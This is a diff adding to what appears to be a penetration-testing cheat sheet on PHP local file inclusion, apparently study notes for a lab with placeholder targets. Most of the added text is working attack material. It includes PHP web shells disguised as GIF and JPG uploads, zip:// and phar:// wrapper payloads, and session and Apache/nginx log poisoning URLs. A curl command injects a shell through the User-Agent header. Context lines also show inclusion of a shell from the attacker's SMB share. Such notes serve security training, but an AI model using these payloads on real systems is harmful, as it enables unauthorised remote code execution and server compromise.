@@ -229,3 +229,44 @@ impacket-smbserver -smb2support share $(pwd)
 sudo responder -I tun0 -v
 ```
 - http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+
+# Upload File
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+```
+- http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+```bash
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+```
+- http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+
+# log poisoning
+## PHP Session Poisoning
+- `PHPSESSID`를 먼저 찾아야 함.
+- `/var/lib/php/sessions/`, `C:\Windows\Temp\`
+- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+- http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
+- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+<img width="2091" height="568" alt="image" src="https://github.com/user-attachments/assets/74a9ffbf-55d1-481f-9d8f-1f2308ebdcf6" />
+
+- http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+
+## Server Log Poisoning
+- `/var/log/apache2/`, `C:\xampp\apache\logs\`, `/var/log/nginx/`, `C:\nginx\log\`, `proc/self/environ`, `/proc/self/fd/<pid>`,`/var/log/sshd.log`, `/var/log/mail`,`/var/log/vsftpd.log`
+```bash
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
+<img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/9673d26a-6ded-46df-8d67-b7b9e7bf1422" />
